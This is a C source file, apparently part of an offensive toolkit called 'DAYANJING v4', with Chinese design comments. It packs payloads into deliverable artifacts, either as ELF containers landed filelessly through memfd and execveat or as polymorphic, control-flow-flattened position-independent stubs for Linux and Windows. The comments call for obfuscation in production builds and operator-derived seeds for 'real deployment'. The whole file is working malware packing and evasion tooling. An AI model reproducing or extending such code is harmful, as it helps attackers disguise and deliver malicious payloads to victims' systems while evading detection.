/* DAYANJING v4 — 25_deploy / src/deploy_pack.c
 *
 * 把载荷打包成可投送制品。两种模式：
 *
 *   ELF 模式（默认）  <in-elf> <out-dj>
 *       产出 v4 shaped 制品（.dj），由 dp_asm_exec 走 memfd + execveat 落地。
 *
 *   PIC 模式（--pic） <in-payload> <out-poly>
 *       产出多态 + 扁平化存根包裹的制品（.poly），由 dp_asm_exec_pic 走
 *       mmap + 跳转落地。跨平台（Windows 侧对应 VirtualAlloc + 跳转）。
 *
 * 设计约束（不是功能，是防线）：
 *  1. 只调用 20_packer 的接口，不自己发明容器格式。制品格式由 20_packer
 *     独占，这里若另写一套，两端实现差异会造成"能打包不能解"且无从发现。
 *  2. 扁平化在 PIC 模式下默认开启。此前它只在测试里被开启过，产出路径
 *     从未使用——已建好的能力不进产出物，等于没有。
 *     关闭它只用于对照与定位，不用于生产。
 *  3. 种子默认写死以保证构建可复现、测试可断言；真实部署必须用
 *     --seed-file 由操作员密钥派生。制品机密性由 seed 承担，不由格式承担。
 *  4. bind_id / eph_pub 置零表示"不绑定会话"。绑定是可选能力，不是必填项。
 *     留空不会让制品失效（pk_unpack_shaped 不需要它们）。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "packer.h"
#include "poly.h"

/* 建造者种子：真实部署必须用 --seed-file 覆盖为操作员密钥派生的 32 字节。 */
static const uint8_t DEPLOY_SEED[32] = {
    0x44, 0x41, 0x59, 0x41, 0x4e, 0x4a, 0x49, 0x4e,
    0x47, 0x2d, 0x44, 0x45, 0x50, 0x4c, 0x4f, 0x59,
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

static int read_file(const char *path, uint8_t **out, size_t *len)
{
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return -1; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return -1; }
    rewind(f);

    uint8_t *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return -1; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return -1;
    }
    fclose(f);
    *out = buf;
    *len = (size_t)sz;
    return 0;
}

static int write_file(const char *path, const uint8_t *buf, size_t len)
{
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    if (fwrite(buf, 1, len, f) != len) { fclose(f); return -1; }
    fclose(f);
    return 0;
}

/* 由种子文件派生 64 位引擎种子。文件内容不足 8 字节时按剩余字节循环填充，
   但绝不静默回落到默认种子——派生失败必须显式报错，否则会产出"看起来
   成功、实际用的是公开种子"的制品。 */
static int load_seed_file(const char *path, uint64_t *out)
{
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    uint8_t b[8];
    size_t n = fread(b, 1, sizeof(b), f);
    fclose(f);
    if (n == 0) return -1;
    uint64_t v = 0;
    for (size_t i = 0; i < sizeof(b); i++) {
        v = (v << 8) | b[i % n];
    }
    *out = v;
    return 0;
}

static void usage(const char *argv0)
{
    fprintf(stderr,
        "usage: %s <in> <out> [options]\n"
        "  --pic               PIC 模式：产出多态+扁平化存根包裹的制品（默认 ELF/.dj）\n"
        "  --no-flatten        PIC 模式下关闭扁平化（仅供对照，不得用于生产）\n"
        "  --abi win64|sysv    指定存根 ABI（默认 sysv）\n"
        "  --seed-file <path>  由操作员密钥文件派生引擎种子\n",
        argv0);
}

int main(int argc, char **argv)
{
    if (argc < 3) { usage(argv[0]); return 2; }

    const char *in_path  = argv[1];
    const char *out_path = argv[2];
    int pic = 0, flatten = 1, abi = POLY_ABI_SYSV;
    uint64_t seed = 0x59414e4a494e47ULL;         /* 默认引擎种子 */
    const char *seed_file = NULL;

    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "--pic") == 0) {
            pic = 1;
        } else if (strcmp(argv[i], "--no-flatten") == 0) {
            flatten = 0;
        } else if (strcmp(argv[i], "--abi") == 0 && i + 1 < argc) {
            if (strcmp(argv[++i], "win64") == 0)      abi = POLY_ABI_WIN64;
            else if (strcmp(argv[i], "sysv") == 0)    abi = POLY_ABI_SYSV;
            else { fprintf(stderr, "bad --abi\n"); return 2; }
        } else if (strcmp(argv[i], "--seed-file") == 0 && i + 1 < argc) {
            seed_file = argv[++i];
        } else {
            usage(argv[0]);
            return 2;
        }
    }

    if (seed_file && load_seed_file(seed_file, &seed) != 0) {
        fprintf(stderr, "seed-file unusable: %s\n", seed_file);
        return 1;
    }

    uint8_t *raw = NULL;
    size_t raw_len = 0;
    if (read_file(in_path, &raw, &raw_len) != 0) {
        fprintf(stderr, "read %s failed\n", in_path);
        return 1;
    }

    uint8_t *out = NULL;
    size_t olen = 0;

    if (!pic) {
        /* ---- ELF 模式：v4 shaped 制品 ---- */
        size_t cap = pk_size_bound_v4(raw_len);
        out = malloc(cap);
        if (!out) { free(raw); return 1; }

        uint8_t bind_id[PK_BIND_ID_LEN];
        uint8_t eph_pub[PK_EPH_PUB_LEN];
        memset(bind_id, 0, sizeof(bind_id));
        memset(eph_pub, 0, sizeof(eph_pub));

        olen = cap;
        int rc = pk_pack_shaped(raw, raw_len, DEPLOY_SEED, sizeof(DEPLOY_SEED),
                                bind_id, 1u, eph_pub, out, &olen);
        if (rc != 0) {
            fprintf(stderr, "pk_pack_shaped rc=%d (%s)\n", rc, pk_errstr(rc));
            free(raw); free(out); return 1;
        }
    } else {
        /* ---- PIC 模式：多态 + 扁平化存根 ---- */
        poly_ctx *p = poly_new_abi(seed, abi);
        if (!p) { fprintf(stderr, "poly_new_abi failed\n"); free(raw); return 1; }

        if (poly_set_flatten(p, flatten) != 0) {
            fprintf(stderr, "poly_set_flatten failed\n");
            poly_free(p); free(raw); return 1;
        }
        /* 断言生效而不是信返回值：若开关静默失效，产出的是线性存根，
           扁平化能力等于没接进产出路径。 */
        if (poly_flatten(p) != flatten) {
            fprintf(stderr, "flatten flag not applied (got %d want %d)\n",
                    poly_flatten(p), flatten);
            poly_free(p); free(raw); return 1;
        }

        int rc = poly_build(p, raw, raw_len, &out, &olen);
        poly_free(p);
        if (rc != POLY_OK) {
            fprintf(stderr, "poly_build rc=%d\n", rc);
            free(raw); return 1;
        }
    }

    if (write_file(out_path, out, olen) != 0) {
        fprintf(stderr, "write %s failed\n", out_path);
        free(raw); free(out); return 1;
    }

    printf("packed%s: %zu -> %zu bytes -> %s (flatten=%d)\n",
           pic ? "[pic]" : "[elf]", raw_len, olen, out_path,
           pic ? flatten : -1);

    free(raw);
    free(out);
    return 0;
}
